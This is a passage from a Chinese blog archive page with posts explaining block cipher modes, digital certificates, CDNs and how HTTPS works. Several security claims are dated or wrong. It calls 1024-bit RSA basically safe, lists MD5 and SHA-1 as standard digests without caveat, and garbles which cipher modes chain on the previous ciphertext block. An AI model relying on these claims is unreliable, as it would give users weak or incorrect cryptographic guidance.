<li>分组加密的几种模式：ECB（不安全）、CBC（最常用）、CFB、OFB、CTR。</li>
<li>填充(padding)：部分加密模式，当最后一个块的长度小于128位时，需要通过特定的方式进行填充。（ECB、CBC需要填充，CFB、OFB、CTR不需要填充）</li>
<li>初始化向量（IV）：部分加密模式（CFB、OFB、CTR）会将 明文块 与 前一个密文块进行亦或操作。对于第一个明文块，不存在前一个密文块，因此需要提供初始化向量IV（把IV当做第一个明文块 之前的 密文块）。此外，IV也可以让加密结果随机化。</li>
</ol>
<h2 id="七、相关链接"><a href="#七、相关链接" class="headerlink" title="七、相关链接"></a>七、相关链接</h2><p><a href="https://github.com/chyingp/nodejs-learning-guide" target="_blank" rel="noopener">Nodejs学习笔记</a></p>
<p><a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" target="_blank" rel="noopener">Cryptographic hash function</a></p>
<p><a href="https://en.wikipedia.org/wiki/Hash-based_message_authentication_code" target="_blank" rel="noopener">Hash-based message authentication code</a></p>
<p><a href="https://crypto.stackexchange.com/questions/2936/hmac-vs-mac-functions" target="_blank" rel="noopener">HMAC vs MAC functions</a></p>
<p><a href="https://crypto.stackexchange.com/questions/6523/what-is-the-difference-between-mac-and-hmac" target="_blank" rel="noopener">What is the difference between MAC and HMAC?</a></p>
<p><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="noopener">Block cipher mode of operation</a></p>
<p><a href="https://www.zhihu.com/question/25912483/answer/31653639" target="_blank" rel="noopener">RSA的公钥和私钥到底哪个才是用来加密和哪个用来解密？ - 刘巍然-学酥的回答 - 知乎</a></p>
<h4 id="原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html"><a href="#原文：https-www-cnblogs-com-chyingp-p-nodejs-learning-crypto-theory-html" class="headerlink" title="原文：https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html"></a>原文：<a href="https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html" target="_blank" rel="noopener">https://www.cnblogs.com/chyingp/p/nodejs-learning-crypto-theory.html</a></h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/12/网络安全/Node.js中crypto模块/" data-id="cjujf4p59006zcp6fk93nx9sj" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/数字证书的基础知识" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/12/网络安全/数字证书的基础知识/" class="article-date">
  <time datetime="2017-02-12T06:45:23.000Z" itemprop="datePublished">2017-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/12/网络安全/数字证书的基础知识/">数字证书的基础知识</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>在讲数字证书之前必须要讲<strong>非对称加密算法</strong>和<strong>摘要算法</strong>，因为数字证书的基础就是各种加解密算法（非对称加密、摘要算法），而其中的核心就是非对称加密算法了。目前而言加密方法可以分为两大类。一类是<strong>单钥加密</strong>（private key cryptography）也可以称为对称加密，还有一类叫做<strong>双钥加密</strong>（public key cryptography）也可称为非对称加密。前者的加密和解密过程都用同一套密码，后者的加密和解密过程用的是不同的密码。下面来看看对称加密、非对称加密以及摘要算法，他们是怎样应用在数字证书中的。</p>
<h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>对称加密(也叫私钥加密)指加密和解密使用相同密钥的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。</p>
<p>在应用该算法时，它要求发送方和接收方在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都可以对他们发送或接收的消息解密，所以密钥的保密性对通信性至关重要。对称加密算法的特点是算法公开、计算量小、加密速度快、加密效率高。对称加密有很多种算法，由于它效率很高，所以被广泛使用在很多加密协议的核心当中。不足之处是，交易双方都使用同样钥匙，安全性得不到保证。</p>
<h4 id="常见的对称加密算法"><a href="#常见的对称加密算法" class="headerlink" title="常见的对称加密算法"></a>常见的对称加密算法</h4><ul>
<li><strong>DES</strong>：数据加密标准（DES，Data Encryption Standard）是一种使用密钥加密的块密码，它基于使用<strong>56位密钥</strong>的对称算法，这个算法因为包含一些机密设计元素，相对短的密钥长度以及被怀疑内含美国国家安全局（NSA）的后门而在开始时是有争议的，DES现在已经不被视为一种安全的加密算法，主要因为它使用的56位密钥过短，导致容易被破解。为了提供实用所需的安全性，可以使用DES的派生算法3DES来进行加密，虽然3DES也存在理论上的攻击方法。</li>
<li><strong>AES</strong>：高级加密标准（英语：Advanced Encryption Standard，缩写：AES），这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用，2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。AES的区块长度固定为128比特，<strong>密钥长度则可以是128，192或256比特</strong>。</li>
<li><strong>RC4</strong>：RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ronald Rivest在1987年设计的密钥长度可变的流加密算法簇。该算法的速度可以达到DES加密的10倍左右，且具有很高级别的非线性。RC4起初是用于保护商业机密的。但是在1994年9月，它的算法被发布在互联网上，也就不再有什么商业机密了。</li>
<li><strong>IDEA</strong>：是旅居瑞士中国青年学者来学嘉和著名密码专家J.Massey于1990年提出的。它在1990年正式公布并在以后得到增强。这种算法是在DES算法的基础上发展出来的，类似于三重DES，和DES一样IDEA也是属于对称密钥算法。发展IDEA也是因为感到DES具有密钥太短等缺点，已经过时。<strong>IDEA的密钥为128位</strong>，这么长的密钥在今后若干年内应该是安全的。</li>
</ul>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）；并且加密密钥和解密密钥是成对出现的。非对称加密算法在加密和解密过程使用了不同的密钥，非对称加密也称为公钥加密，在密钥对中，其中一个密钥是对外公开的，所有人都可以获取到，称为公钥，其中一个密钥是不公开的称为私钥。</p>
<h4 id="非对称加密的特性"><a href="#非对称加密的特性" class="headerlink" title="非对称加密的特性"></a>非对称加密的特性</h4><ul>
<li>对于一个公钥，有且只有一个对应的私钥。</li>
<li>公钥是公开的，并且不能通过公钥反推出私钥。</li>
<li>通过私钥加密的密文只能通过公钥能解密，通过公钥加密的密文也只能通过私钥能解密。</li>
</ul>
<p>通过公钥是极难推算出私钥的，只能通过穷举，所以只要密钥足够长，要想从公钥推算出私钥几乎不可能的。</p>
<h4 id="非对称加密的主要用途"><a href="#非对称加密的主要用途" class="headerlink" title="非对称加密的主要用途"></a>非对称加密的主要用途</h4><ul>
<li><strong>对信息保密，防止中间人攻击</strong>：将明文使用公钥加密，传输给接收者，这样确保信息只能被有私钥的拥有者解密，其他人无法获得明文信息，因为没有私钥无法进行解密。该方法一般用于交换<strong>对称密钥</strong>。</li>
<li><strong>身份验证和防止信息篡改</strong>：私钥拥有者使用私钥加密一段授权明文，并将授权明文和加密后的密文，以及公钥一并发送出来，接收方只需要通过公钥将密文解密后与授权明文对比是否一致，就可以判断明文在中途是否被篡改过。此方法用于<strong>数字签名</strong>。</li>
</ul>
<h4 id="常见的非对称加密算法"><a href="#常见的非对称加密算法" class="headerlink" title="常见的非对称加密算法"></a>常见的非对称加密算法</h4><ul>
<li><strong>RSA</strong>：1977年，三位数学家Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字命名，叫做RSA算法。从那时直到现在，RSA算法一直是最广为使用的”非对称加密算法”。毫不夸张地说，只要有计算机网络的地方，就有RSA算法。这种算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长RSA密钥是768个二进制位。也就是说，长度超过768位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，<strong>1024位的RSA密钥基本安全，2048位的密钥极其安全</strong>。适用于数字签名和密钥交换。 该算法是目前应用最广泛的公钥加密算法，特别适用于通过 Internet 传送的数据。</li>
<li><strong>DSA</strong>：数字签名算法 (Digital Signature Algorithm, DSA) 由美国国家安全署 (United States National Security Agency, NSA) 发明，已作为数字签名的标准。在DSA数字签名和认证中，发送者使用自己的私钥对文件或消息进行签名，接受者收到消息后使用发送者的公钥来验证签名的真实性。DSA只是一种算法，和RSA不同之处在于它不能用作加密和解密，也不能进行密钥交换，只用于签名，它比RSA要快很多。DSA 算法的安全性取决于自计算离散算法的困难。这种算法，不适用于数据加密，仅适用于数字签名。</li>
<li><strong>Diffie-Hellman</strong>：一种确保共享KEY安全穿越不安全网络的方法。Whitefield与Martin Hellman在1976年提出了一个奇妙的密钥交换协议，称为Diffie-Hellman密钥交换协议/算法(Diffie-Hellman Key Exchange/Agreement Algorithm)。这个机制的巧妙在于需要安全通信的双方可以用这个方法确定对称密钥。然后可以用这个密钥进行加密和解密。但是注意，这个密钥交换协议/算法只能用于密钥的交换，而不能进行消息的加密和解密。双方确定要用的密钥后，要使用其他对称密钥操作加密算法实际加密和解密消息。该算法仅适用于密钥交换。</li>
<li><strong>ECC</strong>：椭圆加密算法（ECC）是一种公钥加密体制，最初由Koblitz和Miller两人于1985年提出，与经典的RSA，DSA等公钥密码体制相比，椭圆密码体制有以下优点：160位的椭圆密钥与1024位的RSA密钥安全性相同；在私钥的加密解密速度上，ECC算法比RSA、DSA速度更快；存储空间占用小；带宽要求低；ECC算法的数学理论非常深奥和复杂，在工程应用中比较难于实现，但它的单位安全强度相对较高。</li>
</ul>
<p>非对称加密算法可能是世界上最重要的算法，它是当今电子商务等领域的基石。非对称加密算法如此强大可靠，却有一个弊端，就是加解密比较耗时。因此，在实际使用中，往往与对称加密和摘要算法结合使用。列如在实体之间交换对称密钥时，或者在签署一封邮件的散列时（数字签名）。</p>
<p>散列是通过应用一种单向数学函数获得的一个定长结果，对于数据而言，叫做散列算法。</p>
<h3 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h3><p>摘要算法是一个神奇的算法，也称为散列或者散列值。是一种与基于密钥（对称密钥或公钥）的加密不同的数据转换类型。散列就是通过把一个叫做散列算法的单向数学函数应用于数据，将任意长度的一块数据转换为一个定长的、不可逆转的数字，其长度通常在128～256位之间。所产生的散列值的长度应足够长，因此使找到两块具有相同散列值的数据的机会很少。</p>
<h4 id="摘要算法具有以下特性："><a href="#摘要算法具有以下特性：" class="headerlink" title="摘要算法具有以下特性："></a>摘要算法具有以下特性：</h4><ul>
<li>只要源文本不同，计算得到的结果，必然不同（或者说机会很少）。</li>
<li>无法从结果反推出源数据（那是当然的，不然就能量不守恒了）。</li>
</ul>
<h4 id="常见的摘要算法："><a href="#常见的摘要算法：" class="headerlink" title="常见的摘要算法："></a>常见的摘要算法：</h4><ul>
<li><strong>MD5</strong>：是RSA数据安全公司开发的一种单向散列算法，MD5被广泛使用，可以用来把不同长度的数据块进行暗码运算成一个固定位位的数值（通常是128位）。</li>
<li><strong>SHA-1</strong>：与 DSA 公钥算法相似，安全散列算法1（SHA-1）也是由 NSA 设计的，并由 NIST 将其收录到 FIPS 中，作为散列数据的标准。它可产生一个 160 位的散列值。SHA-1 是流行的用于创建数字签名的单向散列算法。</li>
<li><strong>MAC（Message Authentication Code）</strong>：消息认证代码，是一种使用密钥的单向函数，可以用它们在系统上或用户之间认证文件或消息，常见的是HMAC（用于消息认证的密钥散列算法）。</li>
<li><strong>CRC（Cyclic Redundancy Check）</strong>：循环冗余校验码，CRC校验由于实现简单，检错能力强，被广泛使用在各种数据校验应用中。占用系统资源少，用软硬件均能实现，是进行数据传输差错检测地一种很好的手段（CRC 并不是严格意义上的散列算法，但它的作用与散列算法大致相同，所以归于此类）。</li>
</ul>
<p>摘要算法用于对比信息源是否一致，因为只要源数据发生变化，得到的摘要必然不同。因为通常结果比源数据要短很多，所以称为“摘要”。</p>
<p>应用场景，如发件人生成邮件的散列值并加密它，然后将它与邮件本身一起发送。而收件人同时解密邮件和散列值，并由接收到的邮件产生另外一个散列值，然后将两个散列值进行比较。如果两者相同，邮件极有可能在传输期间没有发生任何改变。</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名就是对非对称加密和摘要算法的一种应用，能够确保信息在发布后不会被篡改（摘要算法特性），保证数据的完整性和可信性；同时也可以防止数据被他人伪造（非对称加密算法特性）；列如，我们有一段授权文本需要发布时，为了防止中途篡改发布的内容，保证发布文本的完整性，以及文本是由指定的发布者发布的。那么，可以通过摘要算法得到发布内容的摘要，得到摘要之后，发布者使用私钥加密得到密文（签名），这时候将源文本、密文（签名）以及公钥一起发布出去即可。</p>
<p>验证过程为：首先验证公钥是否是发布者的公钥，然后用公钥对密文进行解密，得到摘要，使用发布者对文本同样的摘要算法得到摘要文本，比对摘要是否一致即可确认信息是否被篡改或者是指定发布者发布的。</p>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/ditialSig.jpg" alt></p>
<p>数字签名可以快速验证文本的完整性和合法性，已广泛应用于各个领域。</p>
<p>公钥的验证在后续数字证书的授权链中提到验证方法。</p>
<h3 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h3><h4 id="现实生活中的证书"><a href="#现实生活中的证书" class="headerlink" title="现实生活中的证书"></a>现实生活中的证书</h4><p>在现实生活中，证书顾名思义，就是权限机构颁发的证明。比如英语6级证书，就是教育部门颁发给通过了6级考核的个人的证明，证明这个人的英语能力。我们来看一下这个证书的组成：</p>
<ul>
<li>被证明人：老王</li>
<li>内容：通过了英语六级</li>
<li>盖章：教育部门的公章或钢印</li>
</ul>
<p>当老王用这张证书找工作时，用人单位会通过查看证书的各项内容（尤其是公章），来验证证书的合法性和老王的能力。在现实生活中经常有假的6级证书，这些假证书最重要的就是有一个假公章。现实生活中使用法律法规来约束私刻假公章的行为，但是用人单位可能不能十分准确的判断公章是真是假。而数字签字可以来解决该类问题。</p>
<h4 id="数字证书-1"><a href="#数字证书-1" class="headerlink" title="数字证书"></a>数字证书</h4><p>数字证书就是通过数字签名实现的数字化的证书，在现实生活中公章可以被伪造，但是在计算数字世界中，数字签名是没办法被伪造的，比如上述证书中，在一个证书文件中写明了证书内容，颁发证书时，教育部门用他们的私钥对文件的摘要信息进行签名，将签名和证书文件一起发布，这样就能确保该证书无法被伪造。验证证书是否合法时，首先用教育部门的公钥（公钥是公开的谁都可以获取到）对签名进行解密得到一个摘要信息，使用教育部门同样的摘要算法得到证书的另一个摘要信息，对比两个摘要信息是否一致就能确定该证书是否合法。在一般的证书组成中部分中，还加入了一些其他信息，比如证书的有效期。</p>
<p>数字证书也有很多的签发机构，不同的签发机构签发的证书，用途也是不一样的，比如iOS开发中，使用到的ipa文件签名证书，需要到苹果申请。而在Web访问中为了防止Web内容在网络中安全传输，需要用到的SSL证书则需要向几家公认的机构签发。这些签发机构统称为CA（Certificate Authority）。</p>
<p>Web访问相关的证书可以向国际公认的几个机构：</p>
<ol>
<li><a href="http://www.webtrust.net/" target="_blank" rel="noopener"><strong>WebTrust</strong></a></li>
<li><a href="http://cn.globalsign.com/" target="_blank" rel="noopener"><strong>GlobalSign</strong></a></li>
<li><a href="http://certificate.fyicenter.com/335_Root_CA_GTE_CyberTrust_Global_Root_GTE_CyberTrust_Solutions.html" target="_blank" rel="noopener"><strong>GTE</strong></a></li>
<li><a href="http://www.nortel.com/" target="_blank" rel="noopener"><strong>Nortel</strong></a></li>
<li><a href="http://www.verisign.com/" target="_blank" rel="noopener"><strong>Verisign</strong></a></li>
</ol>
<h4 id="数字证书的验证"><a href="#数字证书的验证" class="headerlink" title="数字证书的验证"></a>数字证书的验证</h4><p>申请证书是为了验证，比如Web应用相关的SSL证书验证方是浏览器，iOS各种证书的验证方是iOS设备。因为数字证书是基于数字签名的，所有数字证书的合法性验证就是验证数字证书的签名是否正确，对于签名的验证在是需要签发机构的公钥才能验证；</p>
<p>对于iOS开发证书来说，申请完签名证书后，还需要安装苹果的公钥证书（XCode安装后会自动安装），这样才能确保我们申请的证书是可以被验证通过的（合法的），可用来进行ipa文件签名的。对于Web相关的证书签名的验证，则是由浏览器来验证，对于国际公认的几个证书签发机构浏览器会内置其公钥证书，用来验证数字证书的可信性。</p>
<p>当数字证书通过验证后，便可以用数字证书做对应的事情，iOS开发证书可以用来对APP进行签名，SSL证书可以用来做Web内容加密处理相关的事情。所以有了这些证书之后，能保证在数据的传输过程中，数据是不会被篡改的，并且信息来源也是不能不修改的，从而确保信息安全。</p>
<p>对于iOS，iOS系统已经将这个验证过程固化在系统中了，除非越狱，否则无法绕过</p>
<h4 id="数字证书的授权链"><a href="#数字证书的授权链" class="headerlink" title="数字证书的授权链"></a>数字证书的授权链</h4><p>数字证书还包含一个授权链信息，举个例子：如果你要申请休假1周，需要你的上司审批，你的上司需要他的上司同意，最终需要大老板同意，那么这一层层的授权，形成了一个授权链，大老板是授权链的根(root)，中间这些环节分别是被更接近root的人授权的。</p>
<p>比如苹果开发者的APP签名证书，该证书可以用来对APP进行签名，该证书实际上是由苹果的Worldwide Developer Relations Certificate Authority（WDRCA）授权签名的，而它是由Apple Certificate Authority授权签名的。在这个关系链中苹果的CA是根。 苹果CA根证书默认是内置在苹果系统中的，所以WDRCA的可信性可以由苹果内置的CA根证书来验证其可信性。</p>
<p>Web相关的SSL证书顶部CA根，则就是上述提到的几家公认的签发机构，当我们需要Web做SSL的证书时，便可以向上述机构申请，通常向根机构申请费用都会比较高，也可以向一些二级授权机构进行申请，选择根机构证书签发的好处就是目前大多数的浏览器都会预装内置了这些权威CA的公钥证书，这样，在使用这些权威CA签发过的证书的时候，浏览器一般不会报风险提示。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>数字证书签名的基础是非对称加密算法，利用了非对称加密的身份验证和防止信息篡改的特性来实现的，在一些其他方面比如HTTPS中密钥交换用的就是非对称加密的保密特性来实现的，在非对称加密算法中RSA应用最广。非对称加密虽好，但却有一个弊端，就是加解密比较耗时，所以一般都是配合对称加密一起使用。</p>
<h4 id="原文：http-www-enkichen-com-2016-02-26-digital-certificate-based"><a href="#原文：http-www-enkichen-com-2016-02-26-digital-certificate-based" class="headerlink" title="原文：http://www.enkichen.com/2016/02/26/digital-certificate-based/"></a>原文：<a href="http://www.enkichen.com/2016/02/26/digital-certificate-based/" target="_blank" rel="noopener">http://www.enkichen.com/2016/02/26/digital-certificate-based/</a></h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/12/网络安全/数字证书的基础知识/" data-id="cjujf4p5l007qcp6f2q71w4jr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/CDN的主要功能" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/10/网络安全/CDN的主要功能/" class="article-date">
  <time datetime="2017-02-10T06:45:23.000Z" itemprop="datePublished">2017-02-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/10/网络安全/CDN的主要功能/">CDN的主要功能</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>CDN主要功能是在不同的地点缓存内容，通过负载均衡技术，将用户的请求定向到最合适的缓存服务器上去获取内容，比如说，是北京的用户，我们让他访问北京的节点，深圳的用户，我们让他访问深圳的节点。通过就近访问，加速用户对网站的访问。解决Internet网络拥堵状况，提高用户访问网络的响应速度。</p>
<p>简单介绍下CDN与传统网站访问的区别：<br><strong>传统访问访问：</strong><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/noCDN.png" alt></p>
<p><strong>使用了CDN的网站访问：</strong><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/haveCDN.png" alt></p>
<p>与传统访问方式不同，CDN网络则是在用户和服务器之间增加缓存层，将用户的访问请求引导到最优的缓存节点而不是服务器源站点，从而加速访问速度。</p>
<p><strong>完整的CDN工作流程：</strong><br><img src="http://7xq1il.com1.z0.glb.clouddn.com/comCDN.png" alt></p>
<p>总结一下CDN的工作原理：通过权威DNS服务器来实现最优节点的选择，通过缓存来减少源站的压力。<br><strong>CDN应用场景：</strong><br><strong>静态网页</strong>图片小文件、博客<br><strong>大文件下载</strong>软件下载、视频点播或图片存储网站<br><strong>动态加速</strong>直播网站<br><strong>应用加速</strong>手机APP</p>
<h4 id="原文：https-www-zhihu-com-question-37353035"><a href="#原文：https-www-zhihu-com-question-37353035" class="headerlink" title="原文：https://www.zhihu.com/question/37353035"></a>原文：<a href="https://www.zhihu.com/question/37353035" target="_blank" rel="noopener">https://www.zhihu.com/question/37353035</a></h4>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://shouliang.github.io/2017/02/10/网络安全/CDN的主要功能/" data-id="cjujf4p58006xcp6fkyzqiwrf" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-网络安全/详解https是如何确保安全的" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/02/09/网络安全/详解https是如何确保安全的/" class="article-date">
  <time datetime="2017-02-09T06:45:23.000Z" itemprop="datePublished">2017-02-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/09/网络安全/详解https是如何确保安全的/">详解https是如何确保安全的</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Https 介绍</p>
<h3 id="什么是Https"><a href="#什么是Https" class="headerlink" title="什么是Https"></a>什么是Https</h3><p>HTTPS（全称：Hypertext Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL</p>
<h3 id="Https的作用"><a href="#Https的作用" class="headerlink" title="Https的作用"></a>Https的作用</h3><p><strong>内容加密</strong>建立一个信息安全通道，来保证数据传输的安全；<br><strong>身份认证</strong>确认网站的真实性<br><strong>数据完整性</strong>防止内容被第三方冒充或者篡改</p>
<h3 id="Https的劣势"><a href="#Https的劣势" class="headerlink" title="Https的劣势"></a>Https的劣势</h3><p>对数据进行加解密决定了它比http慢<br>需要进行非对称的加解密，且需要三次握手。首次连接比较慢点，当然现在也有很多的优化。<br>出于安全考虑，浏览器不会在本地保存HTTPS缓存。实际上，只要在HTTP头中使用特定命令，HTTPS是可以缓存的。Firefox默认只在内存中缓存HTTPS。但是，只要头命令中有Cache-Control: Public，缓存就会被写到硬盘上。 IE只要http头允许就可以缓存https内容，缓存策略与是否使用HTTPS协议无关。</p>
<h3 id="HTTPS和HTTP的区别"><a href="#HTTPS和HTTP的区别" class="headerlink" title="HTTPS和HTTP的区别"></a>HTTPS和HTTP的区别</h3><p>https协议需要到CA申请证书。<br>http是超文本传输协议，信息是明文传输；https 则是具有安全性的ssl加密传输协议。<br>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。<br>http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。<br>http默认使用80端口，https默认使用443端口</p>
<p>下面就是https的整个架构，现在的https基本都使用TLS了，因为更加安全，所以下图中的SSL应该换为<strong>SSL/TLS</strong>。</p>
<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/sslexexplation.png" alt></p>
<p>下面就上图中的知识点进行一个大概的介绍。</p>
<h2 id="加解密相关知识"><a href="#加解密相关知识" class="headerlink" title="加解密相关知识"></a>加解密相关知识</h2><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>对称加密(也叫私钥加密)指加密和解密使用相同密钥的加密算法。有时又叫传统密码算法，就是加密密钥能够从解密密钥中推算出来，同时解密密钥也可以从加密密钥中推算出来。而在大多数的对称算法中，加密密钥和解密密钥是相同的，所以也称这种加密算法为秘密密钥算法或单密钥算法。</p>
<p>常见的对称加密有：DES（Data Encryption Standard）、AES（Advanced Encryption Standard）、RC4、IDEA</p>
<h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>与对称加密算法不同，非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）；并且加密密钥和解密密钥是成对出现的。非对称加密算法在加密和解密过程使用了不同的密钥，非对称加密也称为公钥加密，在密钥对中，其中一个密钥是对外公开的，所有人都可以获取到，称为公钥，其中一个密钥是不公开的称为私钥。</p>
<p>非对称加密算法对加密内容的长度有限制，不能超过公钥长度。比如现在常用的公钥长度是 2048 位，意味着待加密内容不能超过 256 个字节。</p>
<h3 id="摘要算法"><a href="#摘要算法" class="headerlink" title="摘要算法"></a>摘要算法</h3><p>数字摘要是采用单项Hash函数将需要加密的明文“摘要”成一串固定长度（128位）的密文，这一串密文又称为数字指纹，它有固定的长度，而且不同的明文摘要成密文，其结果总是不同的，而同样的明文其摘要必定一致。“数字摘要“是https能确保数据完整性和防篡改的根本原因。</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>数字签名技术就是对“非对称密钥加解密”和“数字摘要“两项技术的应用，它将摘要信息用发送者的私钥加密，与原文一起传送给接收者。接收者只有用发送者的公钥才能解密被加密的摘要信息，然后用HASH函数对收到的原文产生一个摘要信息，与解密的摘要信息对比。如果相同，则说明收到的信息是完整的，在传输过程中没有被修改，否则说明信息被修改过，因此数字签名能够验证信息的完整性。</p>
<p>数字签名的过程如下：明文 –&gt; hash运算 –&gt; 摘要 –&gt; 私钥加密 –&gt; 数字签名</p>
<p>数字签名有两种功效：<br>一、能确定消息确实是由发送方签名并发出来的，因为别人假冒不了发送方的签名。<br>二、数字签名能确定消息的完整性。</p>
<p><strong>注意：</strong><br>数字签名只能验证数据的完整性，数据本身是否加密不属于数字签名的控制范围</p>
<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><h3 id="为什么要有数字证书？"><a href="#为什么要有数字证书？" class="headerlink" title="为什么要有数字证书？"></a>为什么要有数字证书？</h3><p>对于请求方来说，它怎么能确定它所得到的公钥一定是从目标主机那里发布的，而且没有被篡改过呢？亦或者请求的目标主机本本身就从事窃取用户信息的不正当行为呢？这时候，我们需要有一个权威的值得信赖的第三方机构(一般是由政府审核并授权的机构)来统一对外发放主机机构的公钥，只要请求方这种机构获取公钥，就避免了上述问题的发生。</p>
<h3 id="数字证书的颁发过程"><a href="#数字证书的颁发过程" class="headerlink" title="数字证书的颁发过程"></a>数字证书的颁发过程</h3><p>用户首先产生自己的密钥对，并将公共密钥及部分个人身份信息传送给认证中心。认证中心在核实身份后，将执行一些必要的步骤，以确信请求确实由用户发送而来，然后，认证中心将发给用户一个数字证书，该证书内包含用户的个人信息和他的公钥信息，同时还附有认证中心的签名信息(根证书私钥签名)。用户就可以使用自己的数字证书进行相关的各种活动。数字证书由独立的证书发行机构发布，数字证书各不相同，每种证书可提供不同级别的可信度。</p>
<h3 id="证书包含哪些内容"><a href="#证书包含哪些内容" class="headerlink" title="证书包含哪些内容"></a>证书包含哪些内容</h3><p>证书颁发机构的名称<br>证书本身的数字签名<br>证书持有者公钥<br>证书签名用到的Hash算法</p>
<h3 id="验证证书的有效性"><a href="#验证证书的有效性" class="headerlink" title="验证证书的有效性"></a>验证证书的有效性</h3><p><strong>浏览器默认都会内置CA根证书，其中根证书包含了CA的公钥</strong><br>证书颁发的机构是伪造的：浏览器不认识，直接认为是危险证书</p>
<p>证书颁发的机构是确实存在的，于是根据CA名，找到对应内置的CA根证书、CA的公钥。用CA的公钥，对伪造的证书的摘要进行解密，发现解不了，认为是危险证书。</p>
<p>对于篡改的证书，使用CA的公钥对数字签名进行解密得到摘要A，然后再根据签名的Hash算法计算出证书的摘要B，对比A与B，若相等则正常，若不相等则是被篡改过的。</p>
<p>证书可在其过期前被吊销，通常情况是该证书的私钥已经失密。较新的浏览器如Chrome、Firefox、Opera和Internet Explorer都实现了在线证书状态协议（OCSP）以排除这种情形：浏览器将网站提供的证书的序列号通过OCSP发送给证书颁发机构，后者会告诉浏览器证书是否还是有效的。</p>
<p>1、2点是对伪造证书进行的，3是对于篡改后的证书验证，4是对于过期失效的验证。</p>
<h2 id="SSL-与-TLS"><a href="#SSL-与-TLS" class="headerlink" title="SSL 与 TLS"></a>SSL 与 TLS</h2><h3 id="SSL-Secure-Socket-Layer，安全套接字层"><a href="#SSL-Secure-Socket-Layer，安全套接字层" class="headerlink" title="SSL (Secure Socket Layer，安全套接字层)"></a>SSL (Secure Socket Layer，安全套接字层)</h3><p>SSL为Netscape所研发，用以保障在Internet上数据传输之安全，利用数据加密(Encryption)技术，可确保数据在网络上之传输过程中不会被截取，当前为3.0版本。</p>
<p>SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
